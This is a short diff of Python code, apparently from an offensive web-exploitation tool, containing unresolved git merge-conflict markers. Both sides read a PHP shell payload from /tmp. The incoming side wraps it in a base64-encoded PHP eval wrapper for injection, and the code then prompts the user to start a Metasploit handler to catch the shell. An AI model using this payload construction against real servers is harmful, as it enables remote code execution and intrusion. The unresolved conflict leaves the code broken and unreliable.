@@ -278,9 +278,14 @@ class Logs:
         handle.handler()
 
         if self.nostager:
+<<<<<<< HEAD
             payload_file = open("/tmp/{0}.php".format(shell), "r")
             payload = payload_file.read()
             payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
+=======
+            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n",""))
+>>>>>>> ee82da73f6ef374746809f3641d0397d3c51cb99
             payload_file.close()
             progressbar()
             raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
